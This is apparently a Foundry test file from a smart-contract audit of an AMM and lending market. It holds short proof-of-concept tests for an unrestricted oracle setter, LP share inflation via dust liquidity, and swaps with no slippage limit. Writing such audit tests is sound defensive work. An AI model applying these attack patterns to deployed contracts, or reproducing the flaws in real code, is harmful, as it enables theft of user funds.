// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/AMM.sol";
import "../src/PriceFeed.sol";
import "../src/LendingMarket.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender]-=a; balanceOf[to]+=a; return true; }
    function transferFrom(address f,address t,uint256 a) external returns (bool) { allowance[f][msg.sender]-=a; balanceOf[f]-=a; balanceOf[t]+=a; return true; }
    function approve(address s,uint256 a) external returns (bool) { allowance[msg.sender][s]=a; return true; }
}

contract PrimeLendTest is Test {
    MockERC20 t0; MockERC20 t1; MockERC20 usdc;
    AMM amm; PriceFeed pf; LendingMarket lm;
    address attacker = address(0xBAD); address user = address(0xCAFE);

    function setUp() public {
        t0 = new MockERC20(); t1 = new MockERC20(); usdc = new MockERC20();
        amm = new AMM(address(t0), address(t1));
        pf = new PriceFeed();
        lm = new LendingMarket(address(amm), address(usdc), address(pf));
        t0.mint(user, 10 ether); t1.mint(user, 10000e18);
        usdc.mint(address(lm), 1_000_000e6);
        vm.prank(user); t0.approve(address(amm), type(uint256).max);
        vm.prank(user); t1.approve(address(amm), type(uint256).max);
        vm.prank(user); amm.addLiquidity(1 ether, 1000e18);
    }

    function test_AddLiquidity() public view {
        assertGt(amm.totalSupply(), 0);
    }

    function test_PoC_H01_UnrestrictedOracle() public {
        vm.prank(attacker);
        lm.setOracle(address(0x1234));
        (address o) = address(lm.oracle());
        assertEq(o, address(0x1234));
    }

    function test_PoC_H03_LPShareInflation() public {
        // attacker adds tiny liquidity to inflate shares
        t0.mint(attacker, 1); t1.mint(attacker, 1);
        vm.prank(attacker); t0.approve(address(amm), type(uint256).max);
        vm.prank(attacker); t1.approve(address(amm), type(uint256).max);
        vm.prank(attacker);
        uint256 shares = amm.addLiquidity(1, 1);
        assertGt(shares, 0);
    }

    function test_PoC_M01_SwapSlippage() public {
        // swap with minOut=0 succeeds even with terrible price
        vm.prank(user);
        t0.approve(address(amm), type(uint256).max);
        vm.prank(user);
        uint256 out = amm.swap(true, 0.1 ether, 0);
        assertGt(out, 0);
    }
}